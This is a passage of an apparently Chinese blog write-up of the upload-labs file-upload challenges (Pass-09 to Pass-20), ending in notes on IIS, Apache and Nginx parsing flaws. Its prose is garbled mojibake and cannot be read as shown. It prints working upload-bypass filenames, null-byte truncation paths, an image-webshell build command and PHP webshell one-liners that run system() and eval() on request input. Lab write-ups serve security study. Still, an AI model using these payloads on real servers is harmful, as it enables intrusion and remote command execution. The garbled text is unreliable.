class="line">https://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¸€æ¥å°±æ˜¯è¯´è¿™ä¸œè¥¿åº”è¯¥åªèƒ½åœ¨Windowsä¸‹è¿è¡Œäº†</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ1FOK.png" alt="kJ1FOK.png"></p><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p>è¿™ä¸€å…³åƒæ˜¯å‰å‡ å…³çš„ç»„åˆæ‹³ï¼Œè™½ç„¶æŠŠæœ€åçš„ç‚¹ç»™åˆ æ‰ï¼Œä½†æ˜¯ä»ç„¶å¯ä»¥ç»•è¿‡ï¼Œå› ä¸ºè¿™é‡Œçš„è¿‡æ»¤å¹¶æ²¡æœ‰é€’å½’ä¸‹å»ï¼Œåªæ˜¯ä¸€æ­¥ï¼Œè¿™æ ·å°±ç›¸å½“äºSQLæ³¨å…¥é‡Œé¢ç”¨str_replaceåªè¿‡æ»¤ä¸€æ¬¡å…³é”®å­—ä¸€æ ·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥éµå¾ªç€ä»–çš„æ­¥éª¤å»å®ç°è‡ªå·±çš„payloadï¼Œå¯ä»¥è¿™æ ·è®¾ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.php. .</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¸€æ¥æ£€æµ‹åˆ°æœ€åçš„æ–‡ä»¶åæ˜¯<code>4.php.</code>è¿™æ ·å°±ç›¸å½“äºç¬¬ä¸ƒå…³äº†</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ1zB8.png" alt="kJ1zB8.png"></p><h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><p>å…³é”®è¿‡æ»¤çš„ä»£ç å°±è¿™ä¸¤å¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">   $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br></pre></td></tr></table></figure><p>è·Ÿæˆ‘ä¸Šä¸€å…³è®²çš„SQLæ³¨å…¥çš„ç±»å‹å·®ä¸å¤šï¼Œå°±æ˜¯åŒå†™ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.pphphp</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJ3yKP.png" alt="kJ3yKP.png"></p><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><p>å…³é”®çš„ä»£ç åœ¨äºè¿™é‡Œçš„â€™save_pathâ€™æ˜¯ä¸€ä¸ªå¯æ§çš„å˜é‡ï¼Œä½†æ˜¯åé¢è¿˜æ‹¼æ¥ä¸Šä¸€ä¸ªåç¼€åï¼Œä¹Ÿéœ€è¦ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨%00æˆªæ–­ï¼Œä½†è¿™ä¸œè¥¿æœ‰ç‚¹è¿‡æ°”äº†ï¼Œå› ä¸ºéœ€è¦ä¸¤ä¸ªæ¡ä»¶</p><ol><li>phpç‰ˆæœ¬å°äº5.3.4</li><li>phpçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€</li></ol><p>å¦‚æœè¦å®Œæˆè¿™ä¸€ä¸ªé¢˜ç›®å°±å¿…é¡»è¦å®ç°ä¸Šé¢çš„ä¸¤ä¸ªæ¡ä»¶ï¼Œä½†æ˜¯ç°åœ¨éƒ½PHP7äº†ï¼Œè¿™ä¸œè¥¿ä¹Ÿå°±å¾ˆå°‘è§äº†ï¼Œæ»¡è¶³ä¸Šé¢çš„æ¡ä»¶çš„æ—¶å€™phpå°±æ˜¯æŠŠå®ƒå½“æˆç»“æŸç¬¦ï¼Œåé¢çš„æ•°æ®ç›´æ¥å¿½ç•¥ï¼Œè¿™ä¹Ÿå¯¼è‡´äº†å¾ˆå¤šçš„é—®é¢˜ï¼Œæ–‡ä»¶åŒ…å«ä¹Ÿå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹</p><p>æ‰€ä»¥å¦‚æœè¦ç»•è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·å»å®ç°ï¼Œå¦save_pathç­‰äºä¸‹é¢çš„å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../upload/4.php%00</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJcCUH.png" alt="kJcCUH.png"></p><h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><p>è¿™é‡Œçš„æºä»£ç å°±æ”¹äº†ä¸€ç‚¹ç‚¹ï¼Œå°±æ˜¯æŠŠgetæ”¹ä¸ºpostç±»å‹ï¼Œä¸€æ ·çš„æ–¹å¼ç»•è¿‡ï¼Œåªä¸è¿‡è¿™é‡Œéœ€è¦åœ¨äºŒè¿›åˆ¶é‡Œé¢ä¿®æ”¹%00ï¼Œå› ä¸ºpostä¸ä¼šåƒgetå¯¹%00è¿›è¡Œè‡ªåŠ¨è§£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJcP5d.png" alt="kJcP5d.png"></p><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>ä»è¿™ä¸€å…³å¼€å§‹è¦æ±‚ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œä½†æ˜¯æ²¡æœ‰åŠæ³•ç›´æ¥æ‰§è¡Œå›¾ç‰‡é©¬ï¼Œéœ€è¦å¦å¤–çš„æ–¹æ³•å»å®ç°ä¸€èˆ¬æ˜¯åŠ ä¸Šphpä¼ªåè®®å»getshellï¼Œå¸¸è§çš„æœ‰pharï¼Œzipç­‰ç­‰<br>å¦‚æœæƒ³è¦çœ‹åˆ°è¯¦ç»†çš„æ•ˆæœå¯ä»¥å†™ä¸€ä¸‹ç®€å•çš„è„šæœ¬æ”¾åœ¨uploadç›®å½•ä¸‹å³å¯ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">include</span> $_GET[file];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€æœ€æœ€ç®€å•çš„å›¾ç‰‡é©¬ç›´æ¥ä¸€æ¡å‘½ä»¤å³å¯ç”Ÿæˆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy normal.jpg /b + shell.php /a webshell.jpg</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œå†…å®¹å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰è„šæœ¬è¯­è¨€</p><p><img src="https://s2.ax1x.com/2019/02/04/kJcYrT.png" alt="kJcYrT.png"></p><p>æŠŠè¯¥å›¾ç‰‡ä¸Šä¼ ä¸Šå»ï¼Œå°è¯•æ–‡ä»¶åŒ…å«ï¼ŒæˆåŠŸå›æ˜¾</p><p><img src="https://s2.ax1x.com/2019/02/04/kJcaa4.png" alt="kJcaa4.png"></p><p>è¿™é‡Œå¯ä»¥å‘ç°æºä»£ç åªæ˜¯ç”¨äº†unpackè¿™ä¸€ä¸ªå‡½æ•°å»å®ç°å¯¹äºphpå‰ä¸¤ä¸ªå­—èŠ‚çš„æ£€æµ‹ï¼Œä¹Ÿå°±æ˜¯åªæ˜¯å¯¹æ–‡ä»¶å¤´åšæ£€æµ‹ã€‚ã€‚ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$bin = fread($file, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);</span><br></pre></td></tr></table></figure><h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>ç±»ä¼¼ä¸Šä¸€ä¸ªé¢˜ç›®,è·å–äº†å›¾ç‰‡çš„ç›¸å…³çš„å¤§å°åŠç±»å‹ï¼Œå¹¶éªŒè¯æ˜¯å¦æ—¶åˆ»ä¸Šä¼ çš„å›¾ç‰‡ï¼ŒåŒæ ·å¯ä»¥ä½¿ç”¨æ–‡ä»¶å¤´çš„æ–¹å¼ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$info = getimagesize($filename);</span><br><span class="line">$ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJchid.png" alt="kJchid.png"></p><p>è¯´æ˜info[2]æ˜¯ä¸€ä¸ªæ–‡ä»¶çš„ç±»å‹ï¼ŒåŒæ ·çš„æ–¹æ³•ä¹Ÿæ˜¯å¯ä»¥ç»•è¿‡çš„</p><p><img src="https://s2.ax1x.com/2019/02/04/kJcrxx.png" alt="kJcrxx.png"></p><h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>æ¢äº†ä¸€ä¸ªè·å–å›¾ç‰‡ä¿¡æ¯çš„å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//éœ€è¦å¼€å¯php_exifæ¨¡å—</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJcLdg.png" alt="kJcLdg.png"></p><p>è·Ÿpass-13ä¸€æ ·çš„ç»•è¿‡æ–¹æ³•</p><h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>è¿™ä¸€å…³å¯¹åç¼€åå’Œæ–‡ä»¶ç±»å‹å•¥çš„éƒ½è¿›è¡Œäº†å¾ˆä¸¥æ ¼çš„æ§åˆ¶ï¼Œè€Œä¸”åœ¨åé¢è¿˜å¯¹å›¾ç‰‡è¿›è¡Œäº†äºŒæ¬¡ç¼–è¯‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">$im = imagecreatefromjpeg($target_path);</span><br></pre></td></tr></table></figure><p>è¿™ä¸€ä¸ªé¢˜ç›®è·Ÿä¸Šæ¬¡æ ¡èµ›çš„é¢˜ç›®æ€è·¯ä¸€è‡´ï¼Œå¯»æ‰¾å›¾ç‰‡è¢«æ¸²æŸ“åä¸åŸå§‹å›¾ç‰‡éƒ¨åˆ†å¯¹æ¯”ä»ç„¶ç›¸åŒçš„æ•°æ®å—éƒ¨åˆ†ï¼Œå°†Webshellä»£ç æ’åœ¨è¯¥éƒ¨åˆ†ï¼Œç„¶åä¸Šä¼ ï¼Œä¸‹è½½ä¸‹æ¥åå‘ç°è¿™ä¸€éƒ¨åˆ†æ’å…¥ä»£ç çš„æ²¡å˜ä½†æ˜¯å…¶ä»–éƒ¨åˆ†éƒ½å˜äº†</p><p><img src="https://s2.ax1x.com/2019/02/04/kJgrkQ.png" alt="kJgrkQ.png"></p><p>å°è¯•æ–‡ä»¶åŒ…å«ï¼Œåé¢æ€ä¹ˆåˆ©ç”¨å°±ä¸å¤šè¯´äº†</p><p><img src="https://s2.ax1x.com/2019/02/04/kJgq6x.png" alt="kJgq6x.png"></p><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>è¿™ä¸€å…³æ˜¯æ¡ä»¶ç«äº‰çš„é—®é¢˜ï¼ŒæŸ¥çœ‹æºä»£ç å°±ä¼šå‘ç°ä½ éœ€è¦åœ¨ç¼“å­˜æ–‡ä»¶è½¬ç§»åˆ°åˆ«çš„ç›®å½•çš„æ—¶å€™ï¼Œèµ¶ç´§è®¿é—®å®ƒï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨burpå»å‘åŒ…ï¼Œå¯ä»¥æŠŠæ–‡ä»¶å†…å®¹æ”¹æˆä¸‹é¢è¿™æ ·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $c=fopen(<span class="string">'./cmd.php'</span>,<span class="string">'w'</span>);fwrite($c,<span class="string">'&lt;?php system($_GET["f"]);?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…è¿™æ ·ï¼Œåæ­£å°±æ˜¯ä¸ºäº†å†™æ–‡ä»¶è¿›å»å°±å¯¹äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[cmd]?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJ2d3R.png" alt="kJ2d3R.png"></p><p>ä¸¤ä¸ªburpè·‘ä¸€è·‘ï¼Œå°±ä¼šåœ¨è¯¥æ–‡ä»¶å¤¹ä¸‹é¢äº§ç”Ÿæ–°çš„æ–‡ä»¶äº†</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ2Du6.png" alt="kJ2Du6.png"></p><p>è®¿é—®æˆåŠŸ</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ2W8A.png" alt="kJ2W8A.png"></p><h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p>åŒæ ·çš„ä¹Ÿæ˜¯ä¸€ä¸ªæ¡ä»¶ç«äº‰çš„é—®é¢˜ï¼Œçœ‹ä¸€ä¸‹æºä»£ç å¯ä»¥å‘ç°è¿™é‡Œä½¿ç”¨ç±»å»å®ç°ç›¸å…³æ–¹æ³•ï¼ŒåŒ…æ‹¬æŸ¥çœ‹æ–‡ä»¶åç¼€åï¼Œå¤§å°ç­‰ç­‰</p><p>è¿™é‡Œé¢çš„é—®é¢˜å­˜åœ¨äºä»£ç å°†ä¸Šä¼ æ–‡ä»¶æ›´æ”¹åå­—çš„æ—¶å€™ç»™äº†ä¸ªæ—¶é—´å·®ï¼Œè®©æˆ‘ä»¬å¯ä»¥å»å®ç°è¿™ä¸ªç«äº‰æ•ˆæœï¼ŒåŒæ ·çš„æ–¹æ³•ï¼Œä¸éƒ½è¯´</p><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>è¿™ä¸€å…³æ­£å¸¸åšæ³•åº”è¯¥æ˜¯CVE-2015-2348 move_uploaded_file() 00æˆªæ–­ï¼Œä¸Šä¼ webshellï¼ŒåŒæ—¶è‡ªå®šä¹‰ä¿å­˜åç§°</p><p>ä¸Šä¼ çš„æ–‡ä»¶åç”¨0x00ç»•è¿‡ã€‚æ”¹æˆ<code>xx.phpã€äºŒè¿›åˆ¶00ã€‘.x.jpg</code></p><p>ä½†æ˜¯å‘ç°äº†ä¸€ç§æ›´æœ‰æ„æ€çš„è§£æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pupiles.com/%E7%94%B1%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83.html</span><br></pre></td></tr></table></figure><p>ç®€å•æ¥è¯´å°±æ˜¯<code>move_uploaded_file</code>åº•å±‚ä¼šè°ƒç”¨<code>tsrm_realpath</code>å‡½æ•°å¯¼è‡´ï¼Œé€’å½’åˆ é™¤æ–‡ä»¶åæœ€åçš„<code>/.</code>å¯¼è‡´ç»•è¿‡äº†åç¼€åæ£€æµ‹ï¼ŒåŒæ ·ç±»ä¼¼çš„å‡½æ•°è¿˜æœ‰<code>file_put_content()</code>ï¼Œåæ­£æ‰“å¼€æ–‡ä»¶æµéƒ½ä¼šæœ‰ç±»ä¼¼çš„æ“ä½œ</p><p>æ‰€ä»¥å¯ä»¥è¿™æ ·å­å»ç»•è¿‡<code>6.php/.</code></p><p><img src="https://s2.ax1x.com/2019/02/05/kJTg56.png" alt="kJTg56.png"></p><h3 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h3><p>è¿™ä¸ªé¢˜ç›®ç”¨äº†æ•°ç»„+/.çš„æ–¹å¼å»ç»•è¿‡ï¼Œå› ä¸ºæºä»£ç é‡Œé¢å«æœ‰è¿™æ ·çš„ä¸¤å¥ä»£ç ï¼Œæˆäº†å…³é”®å¾—ç»•è¿‡çš„åœ°æ–¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">                    $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>è¿™åŒæ ·æˆ‘ä»¬å°±éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼Œç¬¬ä¸€ä¸ªæ˜¯å…ˆå¾—ä¿è¯å¦å¤–ä¿®æ”¹çš„åå­—éœ€è¦æ»¡è¶³æ˜¯æ•°ç»„çš„æ¡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠ“åŒ…æ„é€ æ•°ç»„ï¼Œç¬¬äºŒç‚¹ç”±äºåé¢filenameæ„æˆçš„è¿‡ç¨‹ä¸­ç”±äº<code>$file[count($file) - 1]</code>çš„ä½œç”¨ï¼Œå¯¼è‡´<code>$file[1] = NULL</code>ï¼Œæ‰€ä»¥æ„é€ æ–‡ä»¶ååç›¸å½“äºç›´æ¥å°±æ˜¯<code>xx.php/.</code>ï¼Œæ ¹æ®ä¸Šé¢ä¸€é¢˜çš„çŸ¥è¯†ï¼Œå¯ä»¥ç›´æ¥åœ¨<code>move_uploaded_file</code>å‡½æ•°çš„ä½œç”¨ä¸‹å¯ä»¥å°†<code>/.</code>å¿½ç•¥ï¼Œå› æ­¤è¿˜æ˜¯å¯ä»¥ä¸Šä¼ æˆåŠŸçš„ã€‚</p><p>å› æ­¤save_nameå˜é‡çš„ä¸¤ä¸ªå€¼åˆ†åˆ«æ˜¯<code>xx.php/</code>ï¼Œå¦å¤–ä¸€ä¸ªå€¼æ˜¯<code>jpg</code>ï¼Œå…¶å®ä»ä»£ç å®¡è®¡çš„è§’åº¦ä¸Šçœ‹ï¼Œè¿˜æ˜¯å¯æ§å˜é‡å¯¼è‡´è¿™æ ·çš„åæœ</p><p><img src="https://s2.ax1x.com/2019/02/13/k0OSM9.png" alt="k0OSM9.png"></p><p><img src="https://s2.ax1x.com/2019/02/13/k0O9q1.png" alt="k0O9q1.png"></p><h3 id="å°ç»“ä¸€ä¸‹"><a href="#å°ç»“ä¸€ä¸‹" class="headerlink" title="å°ç»“ä¸€ä¸‹"></a>å°ç»“ä¸€ä¸‹</h3><p>upload-labsé‡Œé¢çš„å…³å¡ä¸ªäººæ„Ÿè§‰åªæ˜¯é’ˆå¯¹æ–‡ä»¶ä¸Šä¼ è¿™ä¸ªæ¼æ´å»å¼„çš„ï¼Œå¯ä»¥æ¢³ç†ä¸€ä¸‹ï¼Œå¯ä»¥æ ¹æ®ä¸Šé¢çš„ç»•è¿‡å†™ä¸€ä¸ªfuzzå­—å…¸XD</p><ol><li>å‰ç«¯çš„ç»•è¿‡</li><li>åç¼€åï¼Œæ–‡ä»¶ç±»å‹ï¼Œæ–‡ä»¶å¤´çš„ç»•è¿‡</li><li>Windowsä¸‹::$DATAçš„é—®é¢˜</li><li>å›¾ç‰‡ç»è¿‡äºŒæ¬¡æ¸²æŸ“çš„ç»•è¿‡</li><li>æ ¹æ®ä»£ç è·³è¿›è¿›è¡Œçš„ç»•è¿‡</li><li>æ¡ä»¶ç«äº‰</li></ol><p>è¿˜æœ‰å…¶ä»–çš„ä¸­é—´ä»¶é—®é¢˜å¯¼è‡´çš„è§£ææ¼æ´æ²¡æœ‰å±•ç°å‡ºæ¥ï¼Œå¯èƒ½ç¯å¢ƒé…ç½®æ¯”è¾ƒéº»çƒ¦ï¼Œæƒ³äº†å¾ˆä¹…ï¼Œæˆ‘æ€•è‡ªå·±å¿˜äº†ï¼Œè¿˜æ˜¯è‡ªå·±æ€»ç»“ä¸€ä¸‹ï¼Œä»¥åå¯ä»¥æ‹¿å‡ºæ¥çœ‹ä¸€ä¸‹</p><h4 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h4><p><code>IIS 6.0</code>è§£æåˆ©ç”¨æ–¹æ³•æœ‰ä¸‰ç§ï¼š<br>1.ç›®å½•è§£æ<br>å»ºç«‹xx.aspä¸ºåç§°çš„<code>æ–‡ä»¶å¤¹</code>ï¼Œå°†aspæ–‡ä»¶æ”¾å…¥ï¼Œè®¿é—®/xx.asp/xx.jpgï¼Œå…¶ä¸­xx.jpgå¯ä»¥ä¸ºä»»æ„æ–‡ä»¶åç¼€ï¼Œå³å¯è§£æ<br>2.æ–‡ä»¶è§£æ<br>åç¼€è§£æï¼š/xx.asp;.jpg    /xx.asp:.jpg(æ­¤å¤„éœ€æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶å)<br>3.é»˜è®¤è§£æ<br>IIS6.0 é»˜è®¤çš„å¯æ‰§è¡Œæ–‡ä»¶é™¤äº†aspè¿˜åŒ…å«è¿™ä¸‰ç§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/xxx.asa</span><br><span class="line">/xxx.cer</span><br><span class="line">/xxx.cdx</span><br><span class="line">/xxx.apsx</span><br></pre></td></tr></table></figure><h4 id="IIS-7-0-7-5"><a href="#IIS-7-0-7-5" class="headerlink" title="IIS 7.0/7.5"></a>IIS 7.0/7.5</h4><p>åœ¨æ­£å¸¸å›¾ç‰‡URLåæ·»åŠ  /.phpï¼Œå¯ä»¥è§£æä¸ºphp</p><h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><p>ä¸€èˆ¬éƒ½åœ¨2.3.xä»¥ä¸‹ç‰ˆæœ¬ï¼Œä½†æ˜¯æœ‰æ—¶å€™é…ç½®æ–‡ä»¶çš„ä¸åŒä¹Ÿä¼šå¯¼è‡´ä¸å®‰å…¨</p><p>åç¼€è§£æï¼štest.php.x1.x2.x3<br>Apacheå°†ä»å³è‡³å·¦å¼€å§‹åˆ¤æ–­åç¼€ï¼Œè‹¥x3éå¯è¯†åˆ«åç¼€ï¼Œå†åˆ¤æ–­x2ï¼Œç›´åˆ°æ‰¾åˆ°å¯è¯†åˆ«åç¼€ä¸ºæ­¢ï¼Œç„¶åå°†è¯¥å¯è¯†åˆ«åç¼€è¿›è§£æ<br>test.php.x1.x2.x3åˆ™ä¼šè¢«è§£æä¸ºphp</p><p>æœ€è¿‘åœ¨å‡ºé¢˜çš„æ—¶å€™åœ¨apache 2.1.xçš„ç‰ˆæœ¬å°±å¯ä»¥ç”¨test.php.jpgç›´æ¥å°±å¯ä»¥getshelläº†ï¼ŒçœŸå°´å°¬ã€‚</p><h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><p>Nginx &lt;<code>8.03</code>ç•¸å½¢è§£ææ¼æ´<br>ç›´æ¥åœ¨æ­£å¸¸å›¾ç‰‡URLåæ·»åŠ <code>/.php</code><br>Nginx &lt;=<code>0.8.37</code><br>åœ¨Fast-CGI<code>å…³é—­</code>çš„æƒ…å†µä¸‹ï¼ŒNginx &lt;=0.8.37 ä¾ç„¶å­˜åœ¨è§£ææ¼æ´</p><p>åœ¨ä¸€ä¸ªæ–‡ä»¶è·¯å¾„(/xx.jpg)åé¢åŠ ä¸Š%00.phpä¼šå°† /xx.jpg%00.php è§£æä¸º php æ–‡ä»¶ã€‚</p>]]></content>
      
      <categories>
          
          <category> æ–‡ä»¶ä¸Šä¼  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Dockerfileç¼–å†™</title>
      <link href="/Dockerfile-writing.html"/>
      <url>/Dockerfile-writing.html</url>
